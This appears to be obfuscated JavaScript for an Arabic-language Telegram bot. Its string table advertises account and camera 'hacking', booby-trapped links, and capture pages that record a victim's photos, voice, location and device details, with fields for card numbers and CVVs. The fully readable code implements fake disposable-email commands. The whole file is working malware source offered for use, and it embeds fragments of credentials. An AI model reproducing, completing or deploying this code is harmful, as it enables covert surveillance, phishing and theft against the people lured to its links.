        'مدفوع\x20بسعر',
        'باع\x20هذه\x20ال',
        'ormalize_f',
        'علومات\x20الج',
        'gXCpX',
        '`\x0a*[-]\x20Val',
        'زامبيا\x20🇿🇲',
        'fIOSv',
        'base64',
        'emails.jso',
        'انشاء\x20📅\x20:\x20',
        'في\x20هذا\x20الد',
        'ث\x20خطأ\x20أثنا',
        'fqvJH',
        'wGWxs',
        'رجيه\x20لكتشا',
        'ymypU',
        'securityPr',
        'م\x20الهاتف\x20☎️',
        'jBofg',
        'تم\x20تصنيفه\x20',
        'KNIhQ',
        '7oxkoPuxqz',
        'status',
        'KCSkG',
        'rg/en/byco',
        'منتهى\x20قم\x20ف',
        'eCJUB',
        '@lTV_l',
        'المجر\x20🇭🇺',
        ':</strong>',
        'html',
        'ي\x20🕹',
        'CyTda',
        'لقائي\x20',
        'waiting_fo',
        'QetQw',
        'message:',
        '\x20و\x20الحذر\x20م',
        'لة\x20حالياً',
        'aeXVP',
        'Capital\x20On',
        'تة.',
        'uery',
        'كازاخستان',
        'الصين\x20🇨🇳',
        '\x20الكثير\x20من',
        'ي\x20ع\x20الكثير',
        '/g.html?ch',
        'lwjrT',
        'generate_v',
        'otWRV',
        'ق\x20كامراة\x20م',
        'network',
        '\x20انشاء\x20ايم',
        '\x20حتى\x20يتم\x20ا',
        'سوف\x20يتم\x20فت',
        'BiQQp',
        'ible-pract',
        'xkIKr',
        'ترينيداد\x20و',
        'بنجاح\x20✅',
        'لنسخها.',
        'ستخدمين.',
        '🇵🇹',
        '\x20📏\x0a-\x20إصدار',
        'administra',
        'creator',
        'fari/537.3',
        'ل\x20على\x20المن',
        'bTlUG',
        'خرى\x20لاحقًا',
        'yIepb',
        'ated-drift',
        'ZkSLk',
        'axios',
        'خطأ\x20في\x20جلب',
        'ZpgIT',
        '\x20قم\x20في\x20تعي',
        'IQiAJ',
        '🇸🇻',
        'اليابان\x20🇯🇵',
        'esponse',
        'VISA\x20-\x20DEB',
        'طلب\x20اي\x20اذن',
        '1176348SxUoHa',
        '🇪🇸',
        'الصوره\x20',
        'env',
        'KIDlz',
        'شاء\x20⏰\x20:\x20',
        'pin',
        '/completio',
        'المطور\x20قبل',
        'تخدمين:\x20',
        'rm?chatId=',
        'XktGE',
        'editMessag',
        'https://mo',
        'n.html',
        'ذاكرة\x20المؤ',
        'لمتصفح:\x20',
        'bSkbF',
        'لام\x20أي\x20رسا',
        'وبية\x20🇰🇷',
        'ر\x20مجاناً:',
        'قه\x20عاليه:\x20',
        'lJkBy',
        'جداً\x20لا\x20تق',
        'سلوفينيا\x20🇸🇮',
        'MzJhQ',
        'GtANg',
        'vbCog',
        'ESRMZ',
        'hwSIw',
        '/email/',
        '/record/',
        'deviceType',
        'lo.html',
        'تم\x20انشاء\x20ر',
        'ط\x20🔒',
        'الأرجنتين\x20',
        '<strong>تم',
        'بوك\x20🔮',
        '\x20أي\x20رسالة\x20',
        'ت\x20الجهاز',
        'PDkcU',
        'لرابط\x20إليك',
        'BjCIO',
        'An\x20error\x20o',
        'r_query',
        '7065665133',
        'hMryx',
        'التواصل\x20مع',
        'countryNam',
        'uorescent-',
        'البحث\x20عن\x20ص',
        '\x20🔒',
        '\x20ما</stron',
        'صورة.',
        'بـ\x20\x22https\x22',
        'get_link_',
        'ائل</stron',
        'slice',
        'فحص\x20الرابط',
        'IdaNo',
        '`\x0a*[-]\x20CVV',
        'message_id',
        '🇺🇸',
        'RYIIc',
        'ca.html',
        'ماكاو\x20🇲🇴',
        'process\x20vi',
        'UuDof',
        'khniH',
        '/captureFr',
        'الدردشة\x20مع',
        'إغلاق\x20المو',
        '\x20اخره\x20لاحق',
        'd\x20or\x20video',
        'get_number',
        'giHDF',
        'ا\x20الامر\x20/V',
        'rning-anim',
        'كرة\x20المؤقت',
        'pONbT',
        'CqrXX',
        '\x20الجهاز',
        'trim',
        'س\x20لديك\x20إيم',
        'اختراق\x20الم',
        '\x20اي\x20صوره\x20ف',
        '\x20🔞',
        'hPjgV',
        'store',
        'for\x20chatId',
        'تصفير\x20الذا',
        'يد\x20وهمي\x20لا',
        'Wlpdi',
        'إختراق\x20فري',
        'باكستان\x20🇵🇰',
        'TvjOM',
        'لا\x20توجد\x20صو',
        'بمرجد\x20الدخ',
        'cAdIA',
        'sendLocati',
        '/json',
        'push',
        'غرينلاند\x20🇬🇱',
        'ta\x20found\x20o',
        'البرتغال',
        'ال\x20للتحقق.',
        'nvite',
        'تم\x20اختراق\x20',
        'listen',
        'اقع\x20💣',
        'static',
        'الدنمارك',
        '*اليوزر\x20:\x20',
        'mUBEW',
        'Fifth\x20Thir',
        'Clearing\x20c',
        'ود\x20🇲🇪',
        'npjwx',
        'values',
        '/s.html?ch',
        't.me',
        'زيمبابوي\x20🇿🇼',
        'ائل\x20جديدة.',
        'vice_info',
        'yXbmR',
        'ر\x20لجمع\x20معل',
        'xx.html',
        '\x20حذف\x20حسابك',
        'https://ww',
        'memory',
        'hostname',
        'Error\x20send',
        'Error\x20proc',
        'ScIXG',
        'essing\x20vid',
        'subject',
        'ناميبيا\x20🇳🇦',
        'لهجه\x20اليمن',
        'مالي\x20🇲🇱',
        'colorDepth',
        'check_link',
        '🇬🇹',
        'vHNxG',
        '/F.html?ch',
        '&type=tikt',
        'ة:\x20',
        'املاً\x20قم\x20ب',
        'attempts',
        ':AAELOAVm0',
        '/capture?c',
        'tXqhm',
        '\x0a\x0aاضغط\x20على',
        'o\x20]</stron',
        'ف\x20\x20رساله\x20ج',
        '<strong>•\x20',
        'يح\x20يبدأ\x20بـ',
        'ليبيا\x20🇱🇾',
        'LafES',
        'IT\x20-\x20VISA\x20',
        '\x20🇹🇲',
        '😁.',
        'VvqXV',
        'networkSpe',
        'untry/',
        '\x20المحتله\x20🇮🇱',
        'إسبانيا',
        'بلجيكا\x20🇧🇪',
        'ومات\x20جهازك',
        'لا\x20يوجد\x20اس',
        'mrmCm',
        'لوكسمبورغ\x20',
        'sTNmU',
        'بطًا\x20يبدأ\x20',
        'creationDa',
        'aCUma',
        'WCvdz',
        'الدومينيكا',
        'agram',
        'اختر\x20الدول',
        'total_coun',
        'yyOJv',
        'جهازك\x20او\x20ط',
        '+7KZ',
        'gram:',
        'غير\x20قابل\x20ل',
        's\x20for\x20chat',
        'قر\x20على\x20الز',
        'CXofD',
        'فرنسا\x20🇫🇷',
        'سحب\x20جميع\x20ا',
        'add_names',
        'zBQzE',
        'NebRD',
        'send\x20video',
        'ساحل\x20العاج',
        'tiktok.com',
        'AxNeQ',
        'max',
        '`\x0a*[-]\x20Ban',
        'YQQVI',
        '🇩🇰',
        'مل\x20وهمي\x20\x20/',
        'ن\x20النت\x20قوي',
        '\x22scope\x22:\x22p',
        'bQiYQ',
        '/messages',
        'تصال:\x20',
        'time',
        'vdEbT',
        '📸الصورة\x20',
        'phVQS',
        'Stored\x20and',
        'dIXUZ',
        'فعل.\x20انتظر',
        'ykzDP',
        'browserNam',
        'pnlRz',
        'قر\x20على\x20الر',
        'error',
        'euIUw',
        'جنوب\x20أفريق',
        'com',
        'Agent',
        'ntation',
        'تم\x20إنشاء\x20ا',
        'سوريا\x20🇸🇾',
        'لم\x20يتم\x20اخت',
        'hVdLn',
        'صله\x20اضع\x20في',
        '\x20:\x20`',
        'XkiTk',
        'ZI0_bot',
        'MvXym',
        'OEosk',
        'moMLv',
        '🇪🇨',
        'deviceVers',
        'اختراق\x20فيس',
        'Bearer\x20sk-',
        'ظر\x20عن\x20رقمي',
        'ource_url=',
        '\x20⚡\x0a-\x20الشبك',
        'تايلاند\x20🇹🇭',
        'إختراق\x20ببج',
        '\x0a<strong>ي',
        'hfock',
        'email\x0a\x0aلظه',
        'span.place',
        'qfSnr',
        'أوكرانيا\x20🇺🇦',
        'file_id',
        '\x20•\x20معلومات',
        'c.html',
        'gram',
        'floor',
        'to\x20generat',
        'mOACD',
        '%\x20🔋\x0a-\x20هل\x20ا',
        'احصل\x20على\x20ر',
        'نامج\x20وحذف\x20',
        'عندما\x20\x20تصل',
        'ابه\x20تلجرام',
        'سحب\x20جميع\x20ر',
        'سلوفاكيا\x20🇸🇰',
        'gjMWI',
        'mdRZqoXRZ_',
        '<strong>❗ل',
        'mxALx',
        '44FJVlNt',
        'VXlxE',
        'deleteMess',
        'تلغيم\x20رابط',
        '2oIUdQC',
        'countryFla',
        'امريكا\x20🇺🇸',
        '<strong>ال',
        'QmxOu',
        'odoPj',
        'dotenv',
        'bZEkz',
        'kGliY',
        'rshq_insta',
        'ont/:linkI',
        'KGwKJ',
        'random',
        'fe.html',
        'hatId=',
        'Xbuvc',
        'إيطاليا\x20🇮🇹',
        'oIIYv',
        'h.me/',
        'JSybk',
        'nWwbn',
        'سنغافورة\x20🇸🇬',
        '\x20🔒\x0a-\x20نطاق\x20',
        'rshq_tikto',
        'الصور\x20الرا',
        '\x20الرابط:\x20',
        'CLASSIC',
        'load',
        'https://iw',
        'رام.',
        'phoneNumbe',
        'أرمينيا\x20🇦🇲',
        'ية\x20📷',
        '/xx.html?c',
        'ناء\x20إنشاء\x20',
        't-break',
        'tId\x20',
        'every',
        'me/',
        '.png',
        'لحذر\x20مع\x20ال',
        'لهاتف:\x20',
        'sion',
        'اكتب\x20لي\x20رس',
        '🤣🤣🤣🤣',
        'next_',
        'لرجاء\x20المح',
        '\x20الجهاز:\x20',
        'ه\x20وكلمات\x20ج',
        'lookup',
        'الرجاء\x20توف',
        'حث\x20عن\x20الصو',
        'anHyD',
        'kkHic',
        'split',
        '\x0aلعرض\x20الرس',
        '\x0a𝗣𝗮𝘀𝘀𝗲𝗱\x20✅\x0a',
        'pdgKX',
        'ata:',
        'الكاميرون\x20',
        'لإيماءات\x20ا',
        'عزيزي\x20حمود',
        'gFtuO',
        '\x20رقم\x20وهمي',
        'تم\x20إضافة\x20ا',
        '\x20روبوتًا.',
        'PpSrJ',
        'OEMui',
        '\x20GB\x20💾\x0a-\x20عد',
        '\x20📊\x0a-\x20دقة\x20ا',
        'حاولة\x20مرة\x20',
        'express',
        'ميات\x20الذي\x20',
        'بانه\x20مشبوه',
        '▓░░░░░░]\x205',
        'content',
        'ر\x20رابط\x20🔒',
        'ابط\x20الخاص\x20',
        'كامرات\x20في\x20',
        'RruFp',
        'مرحبًا!\x20اض',
        'sendVoice',
        'fagDg',
        'MBDne',
        'الرسالة\x20رق',
        'YEOlV',
        'ط\x20خمس\x20مرات',
        'lsoZq',
        '\x20أي\x20إيميل\x20',
        '🇮🇩',
        'رابط\x20تجميع',
        'strong>',
        'code',
        'lastUpdate',
        'خطير\x20جداً\x20',
        'كوريا\x20الشم',
        'قد\x20حدث\x20خطأ',
        'ور\x20الهاتف\x20',
        'snapchat.c',
        'BeJHy',
        '\x20🧠\x0a-\x20الذاك',
        'geolocatio',
        'Fhgio',
        'photos',
        '░░░░░░░]\x200',
        '🇳🇮',
        'Generate\x20V',
        'البوسنة\x20وا',
        'imageDatas',
        '*الاسم\x20:\x20',
        'البرتغال\x20🇵🇹',
        'تم\x20لغيم\x20ال',
        'BeXek',
        'ان\x20تخترقك\x20',
        'ت\x20الخبيثه\x20',
        'lMwYD',
        'ook',
        'cleanuri',
        'ccurred:',
        'ank',
        '1199060mNEjDs',
        'تفسير\x20الأح',
        'لفحصه.',
        'upport',
        'nGAvH',
        'ور\x20ابحث\x20عن',
        '/submitCod',
        'آيسلندا\x20🇮🇸',
        'Kit/537.36',
        'شاءه\x20\x20/an\x0a',
        'ssgDA',
        'Id\x20',
        'UKiTP',
        '@hsosgh',
        'رة\x20الداخلي',
        'أذربيجان\x20🇦🇿',
        'ل\x20عن\x20800حر',
        'g.html',
        'DYREA',
        'qRciE',
        'اختراق\x20تيك',
        'response',
        '`\x0a*=======',
        'xXOnS',
        'إيميل\x20الذي',
        '\x20🇰🇾',
        '\x20كاميرات\x20ا',
        'ارساله\x20لضح',
        'substring',
        'k\x20:*\x20`',
        'aThHadlLGB',
        'هونغ\x20كونغ',
        '@uiit89',
        '/submitVid',
        'bveXP',
        'لي30\x20نقطه\x20',
        'اتك\x20[\x20/inf',
        '1932287gJaPsc',
        'CQDvZ',
        'osVersion',
        'zACPa',
        'Failed\x20to\x20',
        'me/ZI0_bot',
        'rbo',
        'gqjNq',
        'جرب\x20دوله\x20م',
        'المغرب\x20🇲🇦',
        '\x20الحساب:*\x0a',
        'ول\x20اليه\x20ال',
        '\x20🎨\x0a-\x20تاريخ',
        'request_ve',
        '\x20🏙️\x0a-\x20عنوان',
        'VGsmh',
        'RFuwf',
        'JRwKr',
        'send',
        'Generating',
        'hotos:\x20',
        'mIbmz',
        '\x20استخدام\x20ا',
        'aOZcf',
        'أفغانستان\x20',
        '.txt',
        'إثيوبيا\x20🇪🇹',
        'تركيا\x20🇹🇷',
        'تحها\x20مجاني',
        '🇺🇿',
        '==========',
        'ymVkz',
        'each',
        '\x0a➖\x20تم\x20الطل',
        'BcIwX',
        '/record/:l',
        'البرازيل\x20🇧🇷',
        'mm.html',
        'ton\x20below\x20',
        '/?page=',
        '\x20من\x20الخورز',
        '\x20🇰🇬',
        'السنغال\x20🇸🇳',
        'ItCEc',
        '/imageRece',
        '\x20لاحقًا.',
        'eGiER',
        'ا\x20الرجاء\x20ا',
        'هاتف\x20هذا\x20ق',
        'rong>',
        'r.html',
        '*[-]\x20Card\x20',
        'single',
        'يمل...</st',
        's://t.me/',
        'إسبانيا\x20🇪🇸',
        'CbgpJ',
        '\x20sent\x20phot',
        '\x20البرامجيا',
        'ع\x20اضافة\x20فا',
        'deo',
        '*الايدي\x20:\x20',
        'toISOStrin',
        'إنشاء\x20إيمي',
        '00%',
        '🇷🇺',
        '\x20المراقبه\x20',
        '1346603ikAooE',
        'إيران\x20🇮🇷',
        'query',
        'woeOZ',
        'zZnqK',
        'دم\x20VIP',
        'ب\x20🛎•\x20\x0a➖\x20رق',
        'ئعة\x20مثل\x20\x0aا',
        'لا\x20بك\x20:\x20|\x20',
        'يه\x20الاصيله',
        'اختراق\x20الك',
        'UyRtc',
        'recordVoic',
        't?start=',
        'browserVer',
        'YGuXP',
        'qIdBX',
        'خص\x20في\x20الدخ',
        'cheerio',
        'غانا\x20🇬🇭',
        'ي\x20تلغيم\x20را',
        'SxFQg',
        'file',
        '\x20الثانية)\x0a',
        'ylfzo',
        'tos',
        'YhfSO',
        'FjbeR',
        'تفادة\x20من\x20ا',
        'https://fa',
        'IYnco',
        'PmeZR',
        'app/',
        'غط\x20على\x20الز',
        '>\x0a\x0aلنشا\x20اي',
        'تعامل\x20معه\x20',
        'صي.',
        'cvVZD',
        'TsVKh',
        'وله\x20بسبب\x20ق',
        '\x20NT\x2010.0;\x20',
        'كواد\x20والرس',
        'اله\x20طويله\x20',
        '🇵🇷',
        'مستخدم\x20لإز',
        'AiEZw',
        'تم\x20إرسال\x20ا',
        '\x0aانمي\x0aوالم',
        'الصوره📸\x20',
        'خول\x20لرابط\x20',
        ')\x0a\x20\x20\x20\x20\x20\x20',
        'بريطانيا\x20🇬🇧',
        'غير\x20متوفر',
        'anding-mas',
        'لانتهاء.',
        'inkId',
        'aRaSM',
        'ssCYx',
        'Ecrjd',
        'jLECH',
        '\x20الحصول\x20عل',
        '?chatId=',
        'لخدمة.</st',
        'EkfSJ',
        'ngan.glitc',
        'JctFa',
        'EcXfA',
        'post',
        'جعلته\x20مشبو',
        'contact',
        'TQDTv',
        '\x20يتم\x20إنشاء',
        'dRmlP',
        'yWtDU',
        'ية\x20فيديو\x20🎥',
        'WHkjJ',
        'QTzuZ',
        'لقد\x20قمنا\x20ب',
        'lFeHY',
        'XJOJP',
        '🇱🇻',
        'تم\x20إزالة\x20ا',
        'اولة\x20مرة\x20أ',
        'YqFYN',
        'الدخول\x20\x20له',
        'repeat',
        'TTpYq',
        '/submitNam',
        'ه\x20عبر\x20رابط',
        '▓▓▓░░░░]\x207',
        'parse',
        'ng>يرجى\x20ات',
        'اعطيني\x20نكت',
        'تم\x20التحقق\x20',
        '`\x0a*[-]\x20Car',
        'بنين\x20🇧🇯',
        'جمع\x20معلوما',
        '\x20المتصفح:\x20',
        'الرجاء\x20الم',
        'longitude',
        'quest:\x20Mis',
        'U.S.\x20Bank',
        'حث.',
        'rshq_faceb',
        '/getNam',
        'يه\x20عبر\x20راب',
        'TDJrp',
        'mDLUd',
        'وخاصه\x20اذا\x20',
        '0.0.0.0\x20Sa',
        'filePhotos',
        'لقد\x20قام\x20ضح',
        'dzzMq',
        'linkId',
        'hJspU',
        '\x20as\x20expect',
        'uOcGN',
        'https://ap',
        'كل\x20صحيح.',
        'hGMAX',
        '\x20|\x20في\x20بـوت',
        'eeMWk',
        'username',
        '\x20نظام\x20التش',
        'Markdown',
        'qytdw',
        'لقد\x20تم\x20اخت',
        'SIGINT',
        '🇫🇷',
        'filter',
        'JCQxV',
        'dxMvT',
        'NNnSb',
        'لمعلومات:\x20',
        'connection',
        'yCWGQ',
        'لمميزات\x20تل',
        '▓▓▓▓▓▓░░░░',
        '\x20🌍\x0a-\x20الدعم',
        'on...\x0a[░░░',
        'nAvailable',
        'get_joke',
        'JDlCi',
        'caEnj',
        'erica',
        'log',
        'ولة\x20الحصول',
        'oKVPj',
        'مشبوه\x20🟠',
        'uHdAJ',
        'add_vip',
        'almunharif',
        '👨🏻‍🏫',
        'SIGTERM',
        'جاري\x20اخترا',
        '\x20جهة\x20الاتص',
        '/ge',
        'حساب\x20جديد⚠️',
        'إندونيسيا\x20',
        'وشكرا.',
        'تم\x20حذف\x20الذ',
        '/:userId',
        '\x20sent\x20vide',
        'getLocatio',
        'GMgjs',
        'Received\x20d',
        'de_',
        'تم\x20اكتشاف\x20',
        'ى\x20صورة\x20الم',
        'get_love_m',
        'HiFZg',
        'k.html',
        '.\x0a\x20⚠️ملاحظه',
        'LciFW',
        'generate_i',
        '\x20على\x20صورة\x20',
        'جورجيا\x20🇬🇪',
        '\x20إيميل\x20وهم',
        'كينيا\x20🇰🇪',
        'بعد</stron',
        '<strong>حد',
        'يه\x20لمعرفة\x20',
        'الجبل\x20الأس',
        'data',
        'Wells\x20Farg',
        'eText',
        'node-teleg',
        'GMFTY',
        'IvOcJ',
        'FrNYA',
        'https://nm',
        'earchResou',
        'type',
        'EnOSc',
        '📞\x20إرسال\x20جه',
        'QPgUq',
        'لم\x20أتمكن\x20م',
        'ط\x20🪄',
        'Ivymx',
        'Processing',
        'json',
        'حدث\x20خطأ\x20أث',
        '▓▓▓▓▓▓▓▓▓▓',
        'جرب\x20دوله\x20ا',
        'فتيارات\x20شب',
        'instagram',
        'lzqzg',
        'من\x20هذا\x20الد',
        'QTdie',
        '\x20اي\x20برمجيا',
        'NgLXi',
        'ar-SA',
        'GHFXw',
        'kygXl',
        '<strong>جا',
        'fetch\x20visa',
        'المكسيك\x20🇲🇽',
        'جلد:\x20',
        'بنغلاديش\x20🇧🇩',
        'مرحبًا!\x20هذ',
        'get_link',
        'سريلانكا\x20🇱🇰',
        'يرجى\x20إرسال',
        'أنغولا\x20🇦🇴',
        'ي\x20في\x20لوحة\x20',
        'ت\x20بنات\x0aخلف',
        'on...\x0a[▓▓░',
        '\x20أثناء\x20جلب',
        'body',
        'PNC\x20Bank',
        'odFCT',
        'لذي\x20رسلك\x20ه',
        '؟:\x20',
        'drRGz',
        'للمسية:\x20',
        'chat',
        'rce/get/?s',
        'Bank\x20of\x20Am',
        'لرابط\x20ملاح',
        '.io/api/v3',
        'لب\x20بحث\x20بال',
        'دما\x20تصل\x20ال',
        'ing\x20video:',
        'vipEs',
        'بريطانيا',
        'xMgkG',
        '</strong>',
        'movAb',
        'rQoHZ',
        'AdSIf',
        'cCSvy',
        'ة\x20الاتصال',
        'ري\x20انشاء\x20ا',
        'k.glitch.m',
        '\x20🗑</strong',
        'ي\x20كلمة\x20الب',
        'ابط\x20دعوة.',
        'https://cu',
        'الهند\x20🇮🇳',
        'nsJPV',
        'لاوس\x20🇱🇦',
        'غوادلوب\x20🇬🇵',
        'facebook.c',
        'الضحيه\x20📲',
        'TMQMl',
        'goFEP',
        'نيجيريا\x20🇳🇬',
        'ucPrV',
        'ZGwzJ',
        'glitch',
        'HFWTY',
        'cETZL',
        'يرات\x20المرا',
        'ختلفه\x20او\x20ح',
        'اكرة\x20المؤق',
        'ليتوانيا\x20🇱🇹',
        'ر\x20بهذا\x20الب',
        'rwoMc',
        'nRgAE',
        '\x20•\x20التصنيف',
        'utu.be',
        '░░░░░░░]\x202',
        'فنلندا\x20🇫🇮',
        'XIRYX',
        'السودان\x20🇸🇩',
        '10mb',
        'العراق\x20🇮🇶',
        '&duration=',
        'MsvRi',
        'لألوان:\x20',
        'exit',
        'ttMvq',
        '/email/new',
        '<strong>اه',
        'cCDFb',
        'Sent\x20photo',
        'ixXsU',
        'صربيا\x20🇷🇸',
        'isa',
        'إيقاف\x20البر',
        'هندوراس\x20🇭🇳',
        'aZxMW',
        'تم\x20انشاء\x20ا',
        'اختراق\x20وات',
        '🇱🇺',
        'wPZUL',
        'PORT',
        'تغير\x20الرقم',
        '\x20📡\x0a-\x20إمكان',
        'ي\x2030\x20نقطه\x20',
        'ال\x20رابط\x20صح',
        ':\x20\x0a\x20اليوزر',
        'رى\x20لاحقًا.',
        'راقبه.....',
        'multer',
        'هونغ\x20كونغ\x20',
        'ovjqs',
        'LkroL',
        'تصوير\x20بدقه',
        'لقد\x20قمت\x20بط',
        'فذ\x20',
        'بوت\x20اختراق',
        '🔗\x20توليد\x20را',
        '\x20سابقاً\x20هو',
        'uery\x22:\x22',
        'لاتفيا',
        'wYveB',
        '15FsQstw',
        'rong>\x0a\x20\x20\x20\x20',
        'لمراقبة\x20📡',
        'pQkne',
        'حدث\x20خطأ:\x20',
        'لاستخراج',
        ']\x20100%',
        'me/VlP_12',
        'TRlsb',
        'QUDEO',
        'الذي\x20يمكن\x20',
        'مية\x20📸',
        'HmlbU',
        'التشيك\x20🇨🇿',
        'اضغط\x20على\x20ا',
        'ل\x20كود\x20الرق',
        'Citibank',
        'قبة\x20📡',
        'sICCw',
        'امرا\x20الخلف',
        'getUserPro',
        '➖\x20تاريج\x20ال',
        'LxJrg',
        'OAvoM',
        'توغو\x20🇹🇬',
        'إستونيا',
        'numbers/',
        'rest-plaus',
        'uploads/',
        'forEach',
        'sRkaU',
        'results',
        'get_camera',
        'sing\x20chatI',
        'mnBkP',
        'مصر\x20🇪🇬',
        'الكثير\x20من\x20',
        'VjXJf',
        'srhcf',
        'لف\x20الشخصي:',
        'ZQBPG',
        'match',
        'ber',
        '🇨🇷',
        'rFGys',
        'qQcAo',
        'اختراق\x20انس',
        'lstatSync',
        'AIOqt',
        'zskFm',
        'بك!\x20وحصلت\x20',
        'الذي\x20تم\x20ان',
        'sendVideo',
        'قيرغيزستان',
        'inline_key',
        '\x20\x0aكلمة\x20الس',
        'لرابط:\x20',
        'NfUyz',
        'tNumB',
        '.com/',
        '\x20تم\x20إنشاؤه',
        'eYFnj',
        'حدث\x20خطأ',
        'puVBF',
        'vzrLH',
        'خدمة:\x20',
        '\x20🔻\x0a-\x20المدي',
        'التمتع\x20في\x20',
        'الدنمارك\x20🇩🇰',
        'OURvL',
        'neNumber',
        'ICJYB',
        'XBLNm',
        'ك\x20VIP',
        '\x20للمتصفح:\x20',
        'sendPhoto',
        'org',
        'ges',
        '\x20المدفوع\x20ت',
        'رقم\x20في\x20وتس',
        'اختراق\x20كام',
        'ieGlo',
        'YDMeg',
        'chatId',
        'hmQbC',
        'i.internal',
        'يات\x0aتصاميم',
        '\x20أثناء\x20محا',
        '.com',
        'رقم\x20الهاتف',
        'ription\x20st',
        'م\x20مستخدم',
        '\x20الذكاء\x20ال',
        'whatsapp.c',
        'vipUsers',
        'internalSt',
        'ستقبال\x20الا',
        'أمريكا',
        'hJRpv',
        'القائمة:\x20',
        'SBwPB',
        'uLWsu',
        'cpuCores',
        'd\x20Bank',
        'ث\x20عن\x20صور.\x0a',
        'الإكوادور\x20',
        '➖\x20وقت\x20الان',
        'isDirector',
        'HbAfv',
        'السعودية\x20🇸🇦',
        'تصوير\x20الضح',
        'معرفة\x20رقم\x20',
        'كندا\x20🇨🇦',
        'ات\x20الجهاز:',
        'عمان\x20🇴🇲',
        '-\x20نوع\x20الات',
        'آمن.',
        'لهرسك\x20🇧🇦',
        'text',
        'QSFJv',
        'me/ygf2gbo',
        'existsSync',
        'number',
        'التحكم:',
        'ه\x20\x0a:\x20https',
        'إضافة\x20أسما',
        'بنما\x20🇵🇦',
        'فيتنام\x20🇻🇳',
        '/de\x0a\x0a<stro',
        'Mozilla/5.',
        'chWXi',
        'ابط\x20التقاط'
    ];
    _0x229b = function () {
        return _0x513989;
    };
    return _0x229b();
}
const EMAILS_FILE = _0x247cf0(0x41a) + 'n';
function readEmails() {
    const _0x14b480 = _0x247cf0, _0x4cae29 = { 'tWSgH': _0x14b480(0x878) };
    try {
        const _0x5d46f0 = fs[_0x14b480(0x324) + 'nc'](EMAILS_FILE, _0x4cae29[_0x14b480(0x8ae)]);
        return JSON[_0x14b480(0x6b1)](_0x5d46f0);
    } catch (_0x55aaa3) {
        return {};
    }
}
function writeEmails(_0x22abd0) {
    const _0xa2a983 = _0x247cf0;
    fs[_0xa2a983(0x243) + _0xa2a983(0x909)](EMAILS_FILE, JSON[_0xa2a983(0x8e1)](_0x22abd0, null, 0x1e31 + 0x45d * -0x2 + -0x1575));
}
bot[_0x247cf0(0x89b)](/\/email/, async _0x722404 => {
    const _0x382fa2 = _0x247cf0, _0xf993c4 = {
            'BBpFw': function (_0x42e064) {
                return _0x42e064();
            },
            'mWxDu': _0x382fa2(0x72d) + _0x382fa2(0x753) + _0x382fa2(0x649) + _0x382fa2(0x645),
            'bZEkz': _0x382fa2(0x378),
            'IvOcJ': _0x382fa2(0x6cc) + _0x382fa2(0x7f3) + _0x382fa2(0x2e8) + _0x382fa2(0x746) + _0x382fa2(0x77b),
            'qdgsk': _0x382fa2(0x931) + _0x382fa2(0x273),
            'FUgqw': _0x382fa2(0x913) + _0x382fa2(0x545),
            'FSIit': function (_0x21932b, _0x57489c) {
                return _0x21932b(_0x57489c);
            },
            'yXbmR': _0x382fa2(0x571) + _0x382fa2(0x5d7) + _0x382fa2(0x49b) + 'g>'
        }, _0x5b2138 = _0x722404[_0x382fa2(0x246)]['id'], _0x1992a1 = _0x722404[_0x382fa2(0x742)]['id'];
    let _0x52ab2d = _0xf993c4[_0x382fa2(0x875)](readEmails);
    _0x52ab2d[_0x5b2138] && delete _0x52ab2d[_0x5b2138];
    try {
        bot[_0x382fa2(0x326) + 'e'](_0x1992a1, _0xf993c4[_0x382fa2(0x91d)], { 'parse_mode': _0xf993c4[_0x382fa2(0x57e)] });
        const _0x5cf573 = Math[_0x382fa2(0x583)]()[_0x382fa2(0x1ee)](-0x1927 + 0x164c + 0x2ff)[_0x382fa2(0x60b)](0x143 * 0xb + -0x23e3 + 0x4 * 0x581, -0x197a + 0xa6b * -0x1 + 0x23ed * 0x1), _0x71f6d9 = _0x382fa2(0x6ee) + _0x5cf573, _0x1cc8c4 = await axios[_0x382fa2(0x69a)](_0xf993c4[_0x382fa2(0x713)], {
                'name': _0x71f6d9,
                'domain': _0xf993c4[_0x382fa2(0x3a6)]
            }, { 'headers': { 'User-Agent': _0xf993c4[_0x382fa2(0x3f8)] } }), _0x2ef57d = _0x1cc8c4[_0x382fa2(0x70e)][_0x382fa2(0x26c)];
        _0x52ab2d[_0x5b2138] = _0x2ef57d, _0xf993c4[_0x382fa2(0x3b8)](writeEmails, _0x52ab2d), bot[_0x382fa2(0x326) + 'e'](_0x1992a1, _0x382fa2(0x48b) + _0x382fa2(0x447) + _0x382fa2(0x1d3) + _0x382fa2(0x8b0) + _0x382fa2(0x96a) + _0x2ef57d + (_0x382fa2(0x3d1) + _0x382fa2(0x1fb) + _0x382fa2(0x1f3) + _0x382fa2(0x2ec) + _0x382fa2(0x95c)), { 'parse_mode': _0xf993c4[_0x382fa2(0x57e)] });
    } catch (_0x1a3f0b) {
        bot[_0x382fa2(0x326) + 'e'](_0x1992a1, _0xf993c4[_0x382fa2(0x4e3)], { 'parse_mode': _0xf993c4[_0x382fa2(0x57e)] });
    }
}), bot[_0x247cf0(0x89b)](/\/an/, _0x2e374a => {
    const _0x252f1d = _0x247cf0, _0x3d7a65 = {
            'kGliY': function (_0x51cc99) {
                return _0x51cc99();
            },
            'niHhh': _0x252f1d(0x378),
            'lLgIJ': _0x252f1d(0x93a) + _0x252f1d(0x69e) + _0x252f1d(0x5cf) + _0x252f1d(0x70a) + 'g>'
        }, _0x337900 = _0x2e374a[_0x252f1d(0x742)]['id'], _0x526a37 = _0x2e374a[_0x252f1d(0x246)]['id'];
    let _0x31492b = _0x3d7a65[_0x252f1d(0x57f)](readEmails);
    if (_0x31492b[_0x526a37]) {
        const _0x5c715f = _0x31492b[_0x526a37];
        bot[_0x252f1d(0x326) + 'e'](_0x337900, _0x252f1d(0x57a) + _0x252f1d(0x607) + _0x252f1d(0x7da) + _0x252f1d(0x79a) + _0x252f1d(0x42f) + _0x252f1d(0x239) + _0x5c715f + (_0x252f1d(0x3d1) + _0x252f1d(0x1fb) + _0x252f1d(0x1f3) + _0x252f1d(0x2ec) + _0x252f1d(0x95c)), { 'parse_mode': _0x3d7a65[_0x252f1d(0x3c4)] });
    } else
        bot[_0x252f1d(0x326) + 'e'](_0x337900, _0x3d7a65[_0x252f1d(0x94e)], { 'parse_mode': _0x3d7a65[_0x252f1d(0x3c4)] });
}), bot[_0x247cf0(0x89b)](/\/Messages/, async _0x2398fb => {
    const _0x305a71 = _0x247cf0, _0x1ff799 = {
            'OEosk': _0x305a71(0x378),
            'ieGlo': function (_0x37487b) {
                return _0x37487b();
            },
